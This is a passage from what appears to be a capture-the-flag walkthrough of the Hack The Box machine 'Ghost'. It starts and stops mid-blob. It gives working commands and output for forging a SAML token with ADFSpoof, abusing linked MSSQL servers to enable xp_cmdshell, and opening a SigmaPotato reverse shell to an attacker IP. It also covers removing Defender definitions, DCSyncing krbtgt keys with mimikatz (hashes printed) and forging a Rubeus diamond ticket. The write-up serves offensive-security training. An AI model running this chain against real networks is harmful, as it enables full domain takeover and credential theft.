R0cHM6Ly9jb3JlLmdob3N0Lmh0Yjo4NDQzPC9BdWRpZW5jZT48L0F1ZGllbmNlUmVzdHJpY3Rpb24%2BPC9Db25kaXRpb25zPjxBdHRyaWJ1dGVTdGF0ZW1lbnQ%2BPEF0dHJpYnV0ZSBOYW1lPSJodHRwOi8vc2NoZW1hcy54bWxzb2FwLm9yZy93cy8yMDA1LzA1L2lkZW50aXR5L2NsYWltcy91cG4iPjxBdHRyaWJ1dGVWYWx1ZT5mbG9yZW5jZS5yYW1pcmV6QGdob3N0Lmh0YjwvQXR0cmlidXRlVmFsdWU%2BPC9BdHRyaWJ1dGU%2BPEF0dHJpYnV0ZSBOYW1lPSJodHRwOi8vc2NoZW1hcy54bWxzb2FwLm9yZy9jbGFpbXMvQ29tbW9uTmFtZSI%2BPEF0dHJpYnV0ZVZhbHVlPmZsb3JlbmNlLnJhbWlyZXo8L0F0dHJpYnV0ZVZhbHVlPjwvQXR0cmlidXRlPjwvQXR0cmlidXRlU3RhdGVtZW50PjxBdXRoblN0YXRlbWVudCBBdXRobkluc3RhbnQ9IjIwMjQtMDctMTdUMTc6MTA6NDUuNjc5WiI%2BPEF1dGhuQ29udGV4dD48QXV0aG5Db250ZXh0Q2xhc3NSZWY%2BdXJuOm9hc2lzOm5hbWVzOnRjOlNBTUw6Mi4wOmFjOmNsYXNzZXM6UGFzc3dvcmRQcm90ZWN0ZWRUcmFuc3BvcnQ8L0F1dGhuQ29udGV4dENsYXNzUmVmPjwvQXV0aG5Db250ZXh0PjwvQXV0aG5TdGF0ZW1lbnQ%2BPC9Bc3NlcnRpb24%2BPC9zYW1scDpSZXNwb25zZT4%3D

```

While the `SAMLRequest` needs to be url-decoded, base64-decoded and inflated, the `SAMLResponse` does not require the last step to make it readable. Doing so provides me with the plaintext **XML** representation of the response.

```python
<samlp:Response ID="_b6f589a7-b273-4edb-8031-82aa194b159e" Version="2.0" IssueInstant="2024-07-17T17:10:57.062Z" Destination="https://core.ghost.htb:8443/adfs/saml/postResponse" Consent="urn:oasis:names:tc:SAML:2.0:consent:unspecified" InResponseTo="_6c238a93e7b225d8a58e2613ccb81eab065f25d7"
	xmlns:samlp="urn:oasis:names:tc:SAML:2.0:protocol">
	<Issuer
		xmlns="urn:oasis:names:tc:SAML:2.0:assertion">http://federation.ghost.htb/adfs/services/trust
	</Issuer>
	<samlp:Status>
		<samlp:StatusCode Value="urn:oasis:names:tc:SAML:2.0:status:Success" />
	</samlp:Status>
	<Assertion ID="_eb52cf73-9de9-427c-875e-c9a442a604ca" IssueInstant="2024-07-17T17:10:57.062Z" Version="2.0"
		xmlns="urn:oasis:names:tc:SAML:2.0:assertion">
		<Issuer>http://federation.ghost.htb/adfs/services/trust</Issuer>
		<ds:Signature
			xmlns:ds="http://www.w3.org/2000/09/xmldsig#">
			<ds:SignedInfo>
				<ds:CanonicalizationMethod Algorithm="http://www.w3.org/2001/10/xml-exc-c14n#" />
				<ds:SignatureMethod Algorithm="http://www.w3.org/2001/04/xmldsig-more#rsa-sha256" />
				<ds:Reference URI="#_eb52cf73-9de9-427c-875e-c9a442a604ca">
					<ds:Transforms>
						<ds:Transform Algorithm="http://www.w3.org/2000/09/xmldsig#enveloped-signature" />
						<ds:Transform Algorithm="http://www.w3.org/2001/10/xml-exc-c14n#" />
					</ds:Transforms>
					<ds:DigestMethod Algorithm="http://www.w3.org/2001/04/xmlenc#sha256" />
					<ds:DigestValue>QqMwOyvMJ69EexIr8wgAQsliQLcCCJWI7zDZQ/de2n0=</ds:DigestValue>
				</ds:Reference>
			</ds:SignedInfo>
			<ds:SignatureValue>REMOVED</ds:SignatureValue>
			<KeyInfo
				xmlns="http://www.w3.org/2000/09/xmldsig#">
				<ds:X509Data>
					<ds:X509Certificate>REMOVED</ds:X509Certificate>
				</ds:X509Data>
			</KeyInfo>
		</ds:Signature>
		<Subject>
			<SubjectConfirmation Method="urn:oasis:names:tc:SAML:2.0:cm:bearer">
				<SubjectConfirmationData InResponseTo="_6c238a93e7b225d8a58e2613ccb81eab065f25d7" NotOnOrAfter="2024-07-17T17:15:57.062Z" Recipient="https://core.ghost.htb:8443/adfs/saml/postResponse" />
			</SubjectConfirmation>
		</Subject>
		<Conditions NotBefore="2024-07-17T17:10:57.062Z" NotOnOrAfter="2024-07-17T18:10:57.062Z">
			<AudienceRestriction>
				<Audience>https://core.ghost.htb:8443</Audience>
			</AudienceRestriction>
		</Conditions>
		<AttributeStatement>
			<Attribute Name="http://schemas.xmlsoap.org/ws/2005/05/identity/claims/upn">
				<AttributeValue>florence.ramirez@ghost.htb</AttributeValue>
			</Attribute>
			<Attribute Name="http://schemas.xmlsoap.org/claims/CommonName">
				<AttributeValue>florence.ramirez</AttributeValue>
			</Attribute>
		</AttributeStatement>
		<AuthnStatement AuthnInstant="2024-07-17T17:10:45.679Z">
			<AuthnContext>
				<AuthnContextClassRef>urn:oasis:names:tc:SAML:2.0:ac:classes:PasswordProtectedTransport</AuthnContextClassRef>
			</AuthnContext>
		</AuthnStatement>
	</Assertion>
</samlp:Response>
```

The assertions are contained within the `<AttributeStatement>` and show the email address and the name of the user. That’s the part I want to modify to hopefully get additional access on the web UI. Putting the parts together, I am still missing the nameformatid that should be within the `NameIdentifer` tag, but that’s not present in the response so I decide to try it with dummy values first.

Changing the assertion to contain the assumed email address of the `Administrator` as well as the name, I run `ADFSpoof` and receive a `SAMLResponse`.

```python
git clone https://github.com/mandiant/ADFSpoof && cd ADFSpoof
python3 -m venv venv && . venv/bin/active
pip install -r requirements.txt
 
python ./ADFSpoof.py \
       --blob ../TKSKey.bin ../DKMkey.bin \
       --server federation.ghost.htb \
       saml2 \
       --endpoint https://core.ghost.htb:8443/adfs/saml/postResponse \
       --rpidentifier https://core.ghost.htb:8443 \
       --assertion '<Attribute Name="http://schemas.xmlsoap.org/ws/2005/05/identity/claims/upn"><AttributeValue>administrator@ghost.htb</AttributeValue></Attribute><Attribute Name="http://schemas.xmlsoap.org/claims/CommonName"><AttributeValue>Administrator</AttributeValue></Attribute>' \
       --nameidformat "urn:oasis:names:tc:SAML:2.0:assertion" \
       --nameid administrator@ghost.htb
 
    ___    ____  ___________                   ____
   /   |  / __ \/ ____/ ___/____  ____  ____  / __/
  / /| | / / / / /_   \__ \/ __ \/ __ \/ __ \/ /_  
 / ___ |/ /_/ / __/  ___/ / /_/ / /_/ / /_/ / __/  
/_/  |_/_____/_/    /____/ .___/\____/\____/_/     
                        /_/                        
 
A tool to for AD FS security tokens
Created by @doughsec
 
PHNhbWxwOlJlc3BvbnNlIHhtbG5zOnNhbWxwPSJ1cm46b2FzaXM6bmFtZXM6dGM6U0FNTDoyLjA6cHJvdG9jb2wiIElEPSJfTUxKUVJXIiBWZXJzaW9uPSIyLjAiIElzc3VlSW5zdGFudD0iMjAyNC0wNy0xN1QxNzoyNTo1MS4wMDBaIiBEZXN0aW5hdGlvbj0iaHR0cHM6Ly9jb3JlLmdob3N0Lmh0Yjo4NDQzL2FkZnMvc2FtbC9wb3N0UmVzcG9uc2UiIENvbnNlbnQ9InVybjpvYXNpczpuYW1lczp0YzpTQU1MOjIuMDpjb25zZW50OnVuc3BlY2lmaWVkIj48SXNzdWVyIHhtbG5zPSJ1cm46b2FzaXM6bmFtZXM6dGM6U0FNTDoyLjA6YXNzZXJ0aW9uIj5odHRwOi8vZmVkZXJhdGlvbi5naG9zdC5odGIvYWRmcy9zZXJ2aWNlcy90cnVzdDwvSXNzdWVyPjxzYW1scDpTdGF0dXM%2BPHNhbWxwOlN0YXR1c0NvZGUgVmFsdWU9InVybjpvYXNpczpuYW1lczp0YzpTQU1MOjIuMDpzdGF0dXM6U3VjY2VzcyIvPjwvc2FtbHA6U3RhdHVzPjxBc3NlcnRpb24geG1sbnM9InVybjpvYXNpczpuYW1lczp0YzpTQU1MOjIuMDphc3NlcnRpb24iIElEPSJfWUFHSVZEIiBJc3N1ZUluc3RhbnQ9IjIwMjQtMDctMTdUMTc6MjU6NTEuMDAwWiIgVmVyc2lvbj0iMi4wIj48SXNzdWVyPmh0dHA6Ly9mZWRlcmF0aW9uLmdob3N0Lmh0Yi9hZGZzL3NlcnZpY2VzL3RydXN0PC9Jc3N1ZXI%2BPGRzOlNpZ25hdHVyZSB4bWxuczpkcz0iaHR0cDovL3d3dy53My5vcmcvMjAwMC8wOS94bWxkc2lnIyI%2BPGRzOlNpZ25lZEluZm8%2BPGRzOkNhbm9uaWNhbGl6YXRpb25NZXRob2QgQWxnb3JpdGhtPSJodHRwOi8vd3d3LnczLm9yZy8yMDAxLzEwL3htbC1leGMtYzE0biMiLz48ZHM6U2lnbmF0dXJlTWV0aG9kIEFsZ29yaXRobT0iaHR0cDovL3d3dy53My5vcmcvMjAwMS8wNC94bWxkc2lnLW1vcmUjcnNhLXNoYTI1NiIvPjxkczpSZWZlcmVuY2UgVVJJPSIjX1lBR0lWRCI%2BPGRzOlRyYW5zZm9ybXM%2BPGRzOlRyYW5zZm9ybSBBbGdvcml0aG09Imh0dHA6Ly93d3cudzMub3JnLzIwMDAvMDkveG1sZHNpZyNlbnZlbG9wZWQtc2lnbmF0dXJlIi8%2BPGRzOlRyYW5zZm9ybSBBbGdvcml0aG09Imh0dHA6Ly93d3cudzMub3JnLzIwMDEvMTAveG1sLWV4Yy1jMTRuIyIvPjwvZHM6VHJhbnNmb3Jtcz48ZHM6RGlnZXN0TWV0aG9kIEFsZ29yaXRobT0iaHR0cDovL3d3dy53My5vcmcvMjAwMS8wNC94bWxlbmMjc2hhMjU2Ii8%2BPGRzOkRpZ2VzdFZhbHVlPjJoYnlVdmttQXdtdHBHNGNJdG5xdTM2bWpnRUdHVWNYVXE2dmRHaE0xWEE9PC9kczpEaWdlc3RWYWx1ZT48L2RzOlJlZmVyZW5jZT48L2RzOlNpZ25lZEluZm8%2BPGRzOlNpZ25hdHVyZVZhbHVlPlAyYVUwWkhJc3RHNVhTcnc4b3AwN0MySW51RGx0UXY1T3prQnFxVFBzT3d5aDFtQWVxNnBmZ29TODVvTkJYMlVOMUZzUGFJd3RqcFhBRS93RlpiK0R1NzNUMkZFRnVmWmgweXk0QUMzODhPZG9KQy9aOWNkYUZTZ0R4cFhSWkdna051L0JCaVArdkhwTXNsakYxODMwaEk5KzBUUGszOE0zajQvTU5qa1I3ZjFGTHh1Y1FyZkdZUStvdTNqZWEreVZ0ampkS2h1VTJvZWNDcUdMVm4vQ1V2cnlqTHVlRGlhMVI1TmJHS2xsYnRxRlNyWWhROUtuZmVERCtmMXE1RUw2dnp5dzFSZElUZVJSdTQ2aXk4cnd2aS9SdU5CT3B6MGswVmZUT1NJcjFVdWpCZmdyZUxPU0syaHBxZDB4S09XMUFjRlJDQlhNc1BIQVg4YWMxRWc0WW5UakhKdWdjU1FLMHR3QkEwM0EreGtEejJRNHBjUmlpUVo4NGtsZHNkNjQrSUhCS1FBbklscy9kNGV6R2tONnlhenI4ZDlyYVVITDVicWtENWdVK3hCYnJCTXNoVVRrTlhBMU9nY3R2cjJER3IwV2oybG9QcDM0dFR5Rzc1ZU14NGhodFlrVGNRTStnWG14Rzh2TVdza2VpeVVJZFZFS01VQVAyQkRuc2hRSlJndllFS2w2MjZPaUJMbFN6cG90U2ZySXpDKzZZRjFZd1ZQUVVsa1NUZk9vbHBGclBSdUdJRXNyaFpFNm14emlyTkxPblJ0SCtDaFRPZm42aW1mc3ZtMFFBWUlhU0kwU01iMkdibEUvM2VSbUVhdkFPamYwbG9FNlg5OFdaU3lKdGx1dS9QQUpJdkprL2pwVmtPOGkxYk9NRmVqdmJFMTlsaWI5T0t1TFZNPTwvZHM6U2lnbmF0dXJlVmFsdWU%2BPGRzOktleUluZm8%2BPGRzOlg1MDlEYXRhPjxkczpYNTA5Q2VydGlmaWNhdGU%2BTUlJRTVqQ0NBczZnQXdJQkFnSVFKRmNXd015YlJhNU80K1dPNXRXb0dUQU5CZ2txaGtpRzl3MEJBUXNGQURBdU1Td3dLZ1lEVlFRREV5TkJSRVpUSUZOcFoyNXBibWNnTFNCbVpXUmxjbUYwYVc5dUxtZG9iM04wTG1oMFlqQWdGdzB5TkRBMk1UZ3hOakUzTVRCYUdBOHlNVEEwTURVek1ERTJNVGN4TUZvd0xqRXNNQ29HQTFVRUF4TWpRVVJHVXlCVGFXZHVhVzVuSUMwZ1ptVmtaWEpoZEdsdmJpNW5hRzl6ZEM1b2RHSXdnZ0lpTUEwR0NTcUdTSWIzRFFFQkFRVUFBNElDRHdBd2dnSUtBb0lDQVFDK0FBT0lmRXF0bFljbjE1M0wxQnZHUWdEeVhUbll3VFJ6c0s1OSt6RTF6Z0dLTzlONW5iOEZrK2RhS3BXTFFhaUg3b0RIYWVudy9RYXhCZzVxZGVEWW1EM296OEt5YUExeWdZQnJ6bTR3VzdGZjg3cks5RmU1SjUvaDZXOWc3NDloNUJJcVBRT3AwbDZzMXJmdW1PY2NONHliVzk1RVdOTDB2dVFYdkMrS1E0RDRnTVh1OG1DR3B4dHZJTDhpbE50SnVJRzNPUllTS2hSYWwweXlKZU9oRzR4Z2xyWkpGMThwOXdobkU2b21nZ21BNm4yc2hEay90dlRZamlpNWU3L2ljV1RLa3JzTUNwYUtVTms3bXhkTVpoUWFiN1NtZktyWk40cFJEN2RWZzV6ekl5RDdVelM5Q0hMQzZ4TnpxL1owaHVhT2FKaE9TZEpTZ2F0L2JzRzhuYngxOUhELyt5cFc5SjJMdE5GdWdkV3RtVUJXRE9RQllWaEI4U2c0VkVHZ1A5anlJdEhIMmJ6c0RmalJkSjhFMXVOSldQL2tRQTErd1lsT2RkTHFVM2IwSXNDdmxBOEV2WVcwVDFSc3U3N280eC93MGdXYjBvUVBFSXo3ejk3M2I0OTZ3cVF0M0RueWZlTzNsWFhmWk5jdmFqNUtDUDJUdEdCK0tzaEY5cGtJUHhxN0YyZ01oN1FqeGpSSHNBMjlWOGpGbzlnTEQ3a1BWaWNhSVVkc2dpRkhuWVFGMTRhNTJKdFIxVjVpTitoOTVKa3V1RXFRV0RCSEF2UEVCQlprRVpIKzV5VCthQ0ZYWFgrQnBQdDNRR2pZTGVKVThDRnNNdG44UVZMWXZMZGNWUnNVblJoL1dIaVh3Sk9PRVZFQ2E5dzcveVZuaGFsQ05CeDFFL2w0S1FJREFRQUJNQTBHQ1NxR1NJYjNEUUVCQ3dVQUE0SUNBUUFXWUtaVzNjRENCTzZkVDN5ZmwzT2N1eXAxTFZLVkkrOXBGeC9iYldwV2pTZGg2YjM5TFR4eEQ3RllVdGh1V1BaM3JGNEcrRmRNRkhIQ3gzWXBFbVVGbkVMS3NYcWhaOTg5QVg1OEkvM21iZlVsS1dlSVBMU0xrcCtlUlpvTUprdDdrMS9LWHREYXNPUW4wTnNnWUVvd0xCSW1NQ011OXV1am5DbUZPd0hQL0lCaGdZUU1IaDQ2QnpTWFdQM2k4VlhiclJ0RHBvL2MvL09GSmhHbW5uRjhaUG1pNHh0emZTREJwVktxd1ZMcDc4Q2d1TXhqUWQrYmRVYjQ1NTg4Wko0Q0xzUGRSUXAzMFdKMS9DTklhZW52Sld0QTJHNUladzVVMEVXQ0pMb1lKV0ZzOWl5T2ExL3k1NXJ1VzZKOGxJR0Qwd21vRWVDbDlDSDFFZDRkelVkVVhmMU1CQ1lQM1g5MmlheHpVRTB1cEdkLzFRbzZIVHl5T2xXdUF3cmtUMlZIRUxLVlpLT2c4K2RseTk3Z3laSWZVdFF3SWtQd05sOHZvMDRjZmoraHpPdkJ6UEtBQVloMTROTGd2ZUFJL0RxTW5PME9LTyt3MUhCS3c2NE5CQ244Z29hekYrUHVGZlVPMHlOSEZMNGt4TXBjYXA2aWV2NmczQlhDU0R3ZnFUVU9FdUVzN3E5b1lLZ3EycW5OVk9USWhoSW5NWEJ6RW02aVAxM2pmdU9vWEpkUEFuRVVYbjR5NXl3QTk3cnRiR25aRVB5eDFmMUVrWC9oYnFCUDR2b2d2OWtsdGFVRUVWWGtTK2hQcHhabWV4Q05yQkQxcTdHSi81MGViWWxDMENldjh3Nk1zOHRNME9ydnBwR1lsV3J0UHdldkV2ZmlSa3dCTEc3RU1BbkxTdz09PC9kczpYNTA5Q2VydGlmaWNhdGU%2BPC9kczpYNTA5RGF0YT48L2RzOktleUluZm8%2BPC9kczpTaWduYXR1cmU%2BPFN1YmplY3Q%2BPE5hbWVJRCBGb3JtYXQ9InVybjpvYXNpczpuYW1lczp0YzpTQU1MOjIuMDphc3NlcnRpb24iPmFkbWluaXN0cmF0b3JAZ2hvc3QuaHRiPC9OYW1lSUQ%2BPFN1YmplY3RDb25maXJtYXRpb24gTWV0aG9kPSJ1cm46b2FzaXM6bmFtZXM6dGM6U0FNTDoyLjA6Y206YmVhcmVyIj48U3ViamVjdENvbmZpcm1hdGlvbkRhdGEgTm90T25PckFmdGVyPSIyMDI0LTA3LTE3VDE3OjMwOjUxLjAwMFoiIFJlY2lwaWVudD0iaHR0cHM6Ly9jb3JlLmdob3N0Lmh0Yjo4NDQzL2FkZnMvc2FtbC9wb3N0UmVzcG9uc2UiLz48L1N1YmplY3RDb25maXJtYXRpb24%2BPC9TdWJqZWN0PjxDb25kaXRpb25zIE5vdEJlZm9yZT0iMjAyNC0wNy0xN1QxNzoyNTo1MS4wMDBaIiBOb3RPbk9yQWZ0ZXI9IjIwMjQtMDctMTdUMTg6MjU6NTEuMDAwWiI%2BPEF1ZGllbmNlUmVzdHJpY3Rpb24%2BPEF1ZGllbmNlPmh0dHBzOi8vY29yZS5naG9zdC5odGI6ODQ0MzwvQXVkaWVuY2U%2BPC9BdWRpZW5jZVJlc3RyaWN0aW9uPjwvQ29uZGl0aW9ucz48QXR0cmlidXRlU3RhdGVtZW50PjxBdHRyaWJ1dGUgTmFtZT0iaHR0cDovL3NjaGVtYXMueG1sc29hcC5vcmcvd3MvMjAwNS8wNS9pZGVudGl0eS9jbGFpbXMvdXBuIj48QXR0cmlidXRlVmFsdWU%2BYWRtaW5pc3RyYXRvckBnaG9zdC5odGI8L0F0dHJpYnV0ZVZhbHVlPjwvQXR0cmlidXRlPjxBdHRyaWJ1dGUgTmFtZT0iaHR0cDovL3NjaGVtYXMueG1sc29hcC5vcmcvY2xhaW1zL0NvbW1vbk5hbWUiPjxBdHRyaWJ1dGVWYWx1ZT5BZG1pbmlzdHJhdG9yPC9BdHRyaWJ1dGVWYWx1ZT48L0F0dHJpYnV0ZT48L0F0dHJpYnV0ZVN0YXRlbWVudD48QXV0aG5TdGF0ZW1lbnQgQXV0aG5JbnN0YW50PSIyMDI0LTA3LTE3VDE3OjI1OjUwLjUwMFoiIFNlc3Npb25JbmRleD0iX1lBR0lWRCI%2BPEF1dGhuQ29udGV4dD48QXV0aG5Db250ZXh0Q2xhc3NSZWY%2BdXJuOm9hc2lzOm5hbWVzOnRjOlNBTUw6Mi4wOmFjOmNsYXNzZXM6UGFzc3dvcmRQcm90ZWN0ZWRUcmFuc3BvcnQ8L0F1dGhuQ29udGV4dENsYXNzUmVmPjwvQXV0aG5Db250ZXh0PjwvQXV0aG5TdGF0ZW1lbnQ%2BPC9Bc3NlcnRpb24%2BPC9zYW1scDpSZXNwb25zZT4%3D
```

Modifying the captured POST request in **Burp** to include the new response receives a **303** redirect from the server while setting a new cookie. Replacing my own cookie in the browser with the new value and refreshing the page (removing `/unauthorized`) logs me into the application as `Administrator`.

<figure><img src="../../../../.gitbook/assets/image (363).png" alt=""><figcaption></figcaption></figure>

#### MSSQL <a href="#mssql" id="mssql"></a>

As an administrator the page grants me access to the _Ghost Config Panel_ where I can execute **SQL** queries and receive their output. It also mentions two linked databases in the `ghost.htb` and `corp.ghost.htb` domain.

<figure><img src="../../../../.gitbook/assets/image (364).png" alt=""><figcaption></figcaption></figure>

Running `SELECT CURRENT_USER` and `SELECT IS_SRVROLEMEMBER('sysadmin');` shows I’m running as **web\_client** and not part of the sysadmin group. The text specifies linked database so that’s where I peek next, maybe the user on the _other_ side is more privileged.

```python
SELECT srvname FROM master..sysservers;
"recordsets": [
    [
        {
            "srvname": "DC01"
        },
        {
            "srvname": "PRIMARY"
        }
    ]
]
--- SNIP ---
 
 
# https://github.com/fortra/impacket/blob/master/impacket/examples/mssqlshell.py#L255C1-L261C68
SELECT * FROM OPENQUERY("PRIMARY", 'SELECT ''LOGIN'' AS ''execute as'', '''' AS ''database'',pe.permission_name,pe.state_desc,pr.name AS ''grantee'', pr2.name AS ''grantor'' FROM sys.server_permissions pe JOIN sys.server_principals pr   ON pe.grantee_principal_id = pr.principal_Id JOIN sys.server_principals pr2   ON pe.grantor_principal_id = pr2.principal_Id WHERE pe.type = ''IM''')
 
"recordsets": [
    [
        {
            "execute as": "LOGIN",
            "database": "",
            "permission_name": "IMPERSONATE",
            "state_desc": "GRANT",
            "grantee": "bridge_corp",
            "grantor": "sa"
        }
    ]
],
--- SNIP ---
```

There are two linked databases servers, `DC01` (where I am currently located) and `PRIMARY`. Apparently I’m using the `bridge_corp` account on **PRIMARY** and can impersonate `sa` there. With those privileges I should be able to enable **xp\_cmdshell** and achieve remote code execution. Luckily the database link is configured with `RPC Out` and I can actually use stored procedures<sup>4</sup> like xp\_cmdshell.

```python
SELECT  is_rpc_out_enabled FROM sys.servers WHERE name = 'DC01';
"recordsets": [
    [
        {
            "is_rpc_out_enabled": true
        }
    ]
],
--- SNIP ---
```

Great, this means I can enable the `xp_cmdshell` on the linked server by running as `sa`.

```python

EXEC('EXECUTE AS LOGIN=''sa''; EXEC master.dbo.sp_configure ''show advanced options'',1; RECONFIGURE;') AT [PRIMARY]
EXEC('EXECUTE AS LOGIN=''sa''; EXEC master.dbo.sp_configure ''xp_cmdshell'',1; RECONFIGURE;') AT [PRIMARY]
 
EXEC('EXECUTE AS LOGIN=''sa''; EXEC xp_cmdshell ''whoami''') AT [PRIMARY]
--- SNIP ---
"output": "nt service\\mssqlserver"
--- SNIP ---

```

The only thing left to do is to get a reverse shell and I opt to do an ASMI bypas and send a `sliver` payload.

#### CORP.GHOST.HTB <a href="#corpghosthtb" id="corpghosthtb"></a>

Getting a new session as `NT Service\MSSQLSERVER` on **PRIMARY**. Checking my privileges shows I do have the `SeImpersonatePrivilege` enabled and that means I can impersonate _anyone_ including the `NT Authority` account. So I’ll run [SigmaPotato](https://github.com/tylerdotrar/SigmaPotato) to get a reverse shell as `NT Authority`.

```python
# In sliver
execute-assembly -t 120 -- SigmaPotato.exe --revshell 10.10.10.10 8888
 
# Local listener
nc -lnvp 8888
listening on [any] 8888 ...
connect to [10.10.10.10] from (UNKNOWN) [10.129.207.216] 49828
 
PS C:\Windows\system32> whoami
nt authority\system
 
PS C:\Windows\system32> & "C:\Program Files\Windows Defender\MpCmdRun.exe" -RemoveDefinitions -All
 
Service Version: 4.18.24050.7
Engine Version: 1.1.24060.5
AntiSpyware Signature Version: 1.415.24.0
AntiVirus Signature Version: 1.415.24.0
 
Starting engine and signature rollback to none...
Done!
```

After succesfully obtaining an highly privileged shell and disabling the AV, on I move on to enumerate the host. Based on the information so far, I’m now in another _child_ domain: `corp.ghost.htb`.

#### Domain Takeover <a href="#domain-takeover" id="domain-takeover"></a>

There’s a `bidirectional` trust between the two domains as seen in the **BloodHound** graph and since I now _owned_ the domain controller for the `corp.ghost.htb` domain I can forge a diamond ticket to move to the other domain as a highly-privileged user. There’s no **SID Filtering** in place, by default with trusts within the same forest<sup>5</sup>, so I can freely impersonate a member of the `Enterprise Admins` group.<br>

<figure><img src="../../../../.gitbook/assets/image (365).png" alt=""><figcaption></figcaption></figure>

To forge a `diamond` ticket I need the following pieces:

* Name and RID of the user I want to impersonate: `Administrator` and `500`
* The SID of a high privileged group in the parent domain, e.g. Enterprise Admins: `S-1-5-21-4084500788-938703357-3654145966-519` (from BloodHound)
* AES256 key for the `krbtgt` user of the child domain (from DCSync)

```python
# In sliver
mimikatz -t 120 '"token::elevate" "privilege::debug" "lsadump::dcsync /user:GHOST-CORP\krbtgt" "exit"'
--- SNIP ---
 
** SAM ACCOUNT **
 
SAM Username         : krbtgt
Account Type         : 30000000 ( USER_OBJECT )
User Account Control : 00000202 ( ACCOUNTDISABLE NORMAL_ACCOUNT )
Account expiration   :
Password last change : 1/31/2024 7:34:01 PM
Object Security ID   : S-1-5-21-2034262909-2733679486-179904498-502
Object Relative ID   : 502
 
Credentials:
  Hash NTLM: 69eb46aa347a8c68edb99be2725403ab
    ntlm- 0: 69eb46aa347a8c68edb99be2725403ab
    lm  - 0: fceff261045c75c4d7f6895de975f6cb
 
Supplemental Credentials:
* Primary:NTLM-Strong-NTOWF *
    Random Value : 4acd753922f1e79069fd95d67874be4c
 
* Primary:Kerberos-Newer-Keys *
    Default Salt : CORP.GHOST.HTBkrbtgt
    Default Iterations : 4096
    Credentials
      aes256_hmac       (4096) : b0eb79f35055af9d61bcbbe8ccae81d98cf63215045f7216ffd1f8e009a75e8d
      aes128_hmac       (4096) : ea18711cfd69feef0c8efba75bca9235
      des_cbc_md5       (4096) : b3e070025110ce1f
```

Now I can move on to create a `diamond` ticket and apply it to my current session to impersonate the `Administrator` in the `Enterprise Admin` group of the parent domain.

```python

# In sliver
rubeus -t 120 -- diamond /tgtdeleg /ticketuser:Administrator /ticketuserid:500 /groups:519 /sids:S-1-5-21-4084500788-938703357-3654145966-519 /krbkey:b0eb79f35055af9d61bcbbe8ccae81d98cf63215045f7216ffd1f8e009a75e8d /nowrap
 
[*] rubeus output:
 
   ______        _                      
  (_____ \      | |                     
   _____) )_   _| |__  _____ _   _  ___ 
  |  __  /| | | |  _ \| ___ | | | |/___)
  | |  \ \| |_| | |_) ) ____| |_| |___ |
  |_|   |_|____/|____/|_____)____/(___/
 
  v2.3.2 
 
[*] Action: Diamond Ticket
 
[*] No target SPN specified, attempting to build 'cifs/dc.domain.com'
[*] Initializing Kerberos GSS-API w/ fake delegation for target 'cifs/PRIMARY.corp.ghost.htb'
[+] Kerberos GSS-API initialization success!
[+] Delegation requset success! AP-REQ delegation ticket is now in GSS-API output.
[*] Found the AP-REQ delegation ticket in the GSS-API output.
[*] Authenticator etype: aes256_cts_hmac_sha1
[*] Extracted the service ticket session key from the ticket cache: hoDs2+jTD9ekdFdEH/DitkCO3yUGlYkl8QVXe1pTRFc=
[+] Successfully decrypted the authenticator
[*] base64(ticket.kirbi):
 
      doIFxjCCBcKgAwIBBaEDAgEWooIExTCCBMFhggS9MIIEuaADAgEFoRAbDkNPUlAuR0hPU1QuSFRCoiMwIaADAgECoRowGBsGa3JidGd0Gw5DT1JQLkdIT1NULkhUQqOCBHkwggR1oAMCARKhAwIBAqKCBGcEggRjktVdMv0rbdzLh7ijkXFsAST55eKoBKXz+IGmLyfEc2Igv9FNxALPkNFR4pXU2K2f8fp595skTUsZk74kDdDKFtmfFgCt3DfagN2Srg34/egXztpJikGWuW/D0XcNpNnvCIyrbKjsZf38nqwrYgJNSGyCE6RZPSjmNlUdbVelcpOXWV0qs056PVVuD1w7Mqu2hdEZDEplbwCn2Uj+eYzQUMPUX65cjv9OKY0LJV7GV5QKo79aNWG9CDfxqbkAvVE+1kS9HZu4THuvCG8wyM9phUW22Uq9a0OA/r4/mB1UuSndnsDnvn343uX3UvdjzKei0mXJbqLZ/uJZvKjFxQLh+BTjebioMralg6inup5r60A4lDMaVKejCA/YG6y3rgUvTcJRESlzU1DAVGHyfHagFwe74pnMUS/sQJRRRQlKpHiTfytABE3EdfgynvGG0mhcs7ohnOrjPWSjyxlO4siQ2stTnFA9o7EGzgpvjT37xLmscEx1fnPfxx7pgM8WJDSiCMDgda3I0utNH+MyezgA3F1axIqn30vlGGXe4XOgyAEM6+nCCsRhL3Z31uFU0ttmt1iZ9kLtAMPuYeB7xYTIPLkwoRK+C83K0KqmR+Yx5XyI41hl+0cVZhs06lu/+FzgBbqE3m8XjZKAhOesHSfvJ+mqqmjlwJb9vdBsb0A9UgM3Bc72B/HemqbvMvHwEaqXFt83C2Q920mcJZdhNdmgcqvIfv+b7hlA3XF6OYa8Z4RfhiVqsKVpKeEJjP3NoMDgGlIcY+F05SddTXsYZ7zZmEdv2zJdKzmi5JntyYhkXoTd/PGfHKL0lWTHB/F5urlzQWJJUxxz9MwObv4MUB3d2IwxzTsl67NCIdmXU+aG9sQOTs4oz2DakGa475VvpXNFLrbqcA9A0FQVJzUSoxwmZsvRfWHkOm71ePle9/7jmpnuW6VtcYmVRFPng3bUiIsw5iv8mq3Def9P8LxtrnAxLECBcYAF/sY8hIGv3PLwkWwesNBIViY4FCT0WUZjL3TUWLeouDtQdmQGqqUwLmw2AihRdkE10l7RjVEuXiDw3SNR8ZJ9XqEGzlfB2HedySkMxHVX1G00ssldd05Wkjm97DzNbdyuFxKj+LnBmPyjbCzhfWpYA5ODs3bcHZ5AComB9Wwjh+RhbD1Zo5vSfjtbktgSSrRQkm4ZaHi7KACNf71TPfHjx1pibAbMALknkbTk1fpTzFpTOp6zof5UzqgS1oOb1CQHZ0naCql/UkR3m5+laDXb208I938yPQoZm1t+1luUPFCwJs6l32D3DlKSf64k6qnuiOi2rn41CeyeWcrMaTBD5urxwWEdF9AmoncJnzJ5VOcI0FRFNVEleg6lYs4NTt7O57hFVCSOQlpvXStgeqjaQAii0TTAYWihkZfdU0AotBUACWd+bq6zJ+JOVwSgKcQzgGXCIZHdISiVbkSQCDzdlJmMi+gv3Fjj5ID1X0HK4peP+HQpAjsyCJhyxzPe1aOB7DCB6aADAgEAooHhBIHefYHbMIHYoIHVMIHSMIHPoCswKaADAgESoSIEIF/6h7ITHTE/HCHGjGwKeIYOXZgaXWPvlLyMIr3aRE9xoRAbDkNPUlAuR0hPU1QuSFRCohUwE6ADAgEBoQwwChsIUFJJTUFSWSSjBwMFAGChAAClERgPMjAyNDA3MTcxOTU2MjFaphEYDzIwMjQwNzE4M